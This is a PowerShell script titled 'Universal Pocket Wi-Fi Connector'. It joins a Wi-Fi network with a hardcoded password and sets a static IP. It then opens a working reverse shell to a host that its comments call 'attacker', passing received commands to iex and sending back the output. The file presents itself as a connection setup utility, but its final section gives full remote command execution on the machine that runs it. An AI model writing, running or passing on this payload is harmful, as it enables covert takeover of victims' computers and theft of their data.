# setup.ps1 - Universal Pocket Wi-Fi Connector
$ssid = "-"
$password = "narnia123fl0v3V"
$attackerIp = "192.168.43.2"  # Your Arch Linux static IP
$reverseShellPort = 4444
$targetIp = "192.168.43.100"   # Target's static IP
$gateway = "192.168.43.1"      # Pocket Wi-Fi gateway (your phone)

Write-Host "Starting Wi-Fi connection process..." -ForegroundColor Cyan

# 1. Disconnect from current networks
Write-Host "  • Disconnecting from current networks..."
netsh wlan disconnect | Out-Null

# 2. Create Wi-Fi profile XML (in memory)
$xml = @"
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$ssid</name>
    <SSIDConfig>
        <SSID>
            <name>$ssid</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$password</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"@

# 3. Add Wi-Fi profile
Write-Host "  • Adding Wi-Fi profile..."
$tempFile = [System.IO.Path]::GetTempFileName()
$xml | Out-File -FilePath $tempFile -Encoding ASCII
netsh wlan add profile filename="$tempFile" user=all | Out-Null
Remove-Item $tempFile -Force

# 4. Connect to pocket Wi-Fi
Write-Host "  • Connecting to pocket Wi-Fi (SSID: $ssid)..."
netsh wlan connect name="$ssid" ssid="$ssid" | Out-Null

# 5. Wait for connection (with progress)
Write-Host "  • Waiting for Wi-Fi connection (max 30s)..."
$timeout = 30
$connected = $false
while ($timeout -gt 0) {
    Start-Sleep -Seconds 1
    $timeout--
    $profile = (Get-NetConnectionProfile | Where-Object {$_.Ssid -eq $ssid})
    if ($profile) {
        $connected = $true
        break
    }
    Write-Host "    • Still connecting... ($timeout seconds remaining)" -ForegroundColor DarkGray
}

if (-not $connected) {
    Write-Host "  • FAILED to connect to Wi-Fi!" -ForegroundColor Red
    exit 1
}

# 6. Configure static IP
$interface = $profile.InterfaceAlias
Write-Host "  • Configuring static IP: $targetIp"
# Remove existing IPv4 configuration
Get-NetIPAddress -InterfaceAlias $interface -AddressFamily IPv4 | 
    Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
# Set new static IP
New-NetIPAddress -InterfaceAlias $interface -IPAddress $targetIp -PrefixLength 24 -DefaultGateway $gateway | Out-Null
# Set DNS
Set-DnsClientServerAddress -InterfaceAlias $interface -ServerAddresses ("8.8.8.8","8.8.4.4") | Out-Null

# 7. Verify connectivity
Write-Host "  • Verifying connection to attacker ($attackerIp)..."
if (-not (Test-Connection $attackerIp -Count 2 -Quiet)) {
    Write-Host "  • WARNING: No connection to attacker IP!" -ForegroundColor Yellow
    Write-Host "    • Is your Arch Linux connected to the same pocket Wi-Fi?" -ForegroundColor Yellow
    Write-Host "    • Is static IP 192.168.43.2 configured?" -ForegroundColor Yellow
    Start-Sleep -Seconds 3
}

# 8. Establish reverse shell
Write-Host "  • Establishing reverse shell connection..." -ForegroundColor Green
try {
    $client = New-Object System.Net.Sockets.TCPClient($attackerIp, $reverseShellPort)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $bytes = New-Object System.Byte[] 1024
    $encoding = New-Object System.Text.ASCIIEncoding

    $writer.WriteLine("Connected from: $env:COMPUTERNAME ($targetIp)")
    $writer.WriteLine("PS $($pwd.Path)> ")
    $writer.Flush()

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = $encoding.GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String)
        $sendback2 = $sendback + "PS $($pwd.Path)> "
        $sendbyte = $encoding.GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }

    $client.Close()
}
catch {
    Write-Host "  • Reverse shell failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
